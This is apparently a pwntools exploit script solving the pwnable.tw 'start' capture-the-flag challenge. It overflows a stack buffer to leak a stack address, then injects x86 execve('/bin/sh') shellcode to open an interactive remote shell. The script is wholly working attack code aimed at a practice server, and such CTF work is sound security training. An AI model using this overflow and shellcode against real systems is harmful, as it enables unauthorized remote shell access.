#!/usr/bin/python
#powerprove

from pwn import *

s = remote("chall.pwnable.tw",10000)
#s = process("./start")
#raw_input("debug")

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = "A"*20
payload += p32(0x8048087)
print s.recvuntil("Let's start the CTF:")
s.sendline(payload)
data = u32(s.recv(4))
print log.info("stack   : "+str(hex(data)))
data = data + 0x20
payload2 = "A"*20
payload2 += p32(data)
payload2 += "\x90"*4
payload2 += shellcode
s.sendline(payload2)
s.interactive()
